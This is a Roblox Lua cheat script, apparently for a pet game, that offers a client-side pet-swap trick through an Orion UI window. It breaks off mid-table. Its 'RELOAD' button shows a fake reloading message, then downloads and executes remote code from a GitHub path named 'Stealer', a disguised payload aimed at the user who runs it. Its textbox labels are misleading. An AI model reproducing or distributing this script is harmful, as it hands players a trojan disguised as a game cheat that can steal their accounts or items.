local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "HectoxHubüçå", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})


local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)

local fromPet = "Cat"
local toPet = "Titanic Monkey"

function FromPet1()
    for i, v in pairs(Pets[fromPet] or {}) do
        Pets[fromPet][i] = nil
    end
end

function ToPet2()
    for i, v in pairs(Pets[toPet] or {}) do
        Pets[fromPet][i] = v
    end
end

local Tab = Window:MakeTab({
	Name = "RELOAD",
	Icon = "4483345998",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = "RELOAD THE SCRIPT IF NOT WORKING",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
	    fromPet = Value
		print(Value)
	end	  
})

Tab:AddTextbox({
	Name = "CLICK THE BUTTON BELOW TO RELOAD",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
       toPet = Value
		print(Value)
	end	  
})

Tab:AddButton({
	    Name = "RELOAD",
    Callback = function()
           local message = require(game.ReplicatedStorage.Library.Client.Message)
        message.Error("RELOADING IN 30SECONDS...")
        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
        print("button pressed")
      end    
})

local Tab = Window:MakeTab({
	Name = "üêïHuge",
	Icon = "rbxassetid://19002502357",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = "From Pet",
	Default = "Cat",
	TextDisappear = true,
